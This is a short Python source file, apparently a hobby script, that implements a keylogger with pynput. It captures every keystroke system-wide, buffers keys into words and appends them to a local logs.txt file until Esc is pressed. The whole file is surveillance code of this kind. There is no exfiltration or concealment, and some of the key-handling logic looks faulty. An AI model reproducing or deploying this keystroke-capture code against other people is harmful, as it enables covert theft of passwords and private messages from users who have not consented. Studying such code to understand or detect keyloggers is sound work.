from pynput.keyboard import Listener, Key

def log_keys(key):
    
    #convert key to string and remove quotes
    keys = str(key).replace("'", "")
    
    #convert special keys
    if keys == 'Key.space':
        keys= ' '
    elif keys in dir (Key):
        keys = f"[{key.name}]"
        
    with open("logs.txt", "a") as log_file:
        log_file.write(f"{keys}\n")
        
    #Function to stop listener on Esc press
def stop_log(key):
    if key == Key.esc:
        return False
    return True
        

# Buffer to store the current word being typed
current_word = []

def on_press(key):
    global current_word
    key_str = str(key).replace("'", "")

    # Convert special keys
    if key_str == 'Key.space':
        key_str = ' '
    elif key_str in dir(Key):
        key_str = f"[{key.name}]"

    # Add the key to the current word buffer
    current_word.append(key_str)

    # Write the current word to the log file if it ends with a space or return
    if key_str == ' ' or key == Key.enter:
        log_keys(''.join(current_word))
        current_word = []

        #start listener
with Listener(on_press=on_press, on_release=stop_log) as listener:
    listener.join()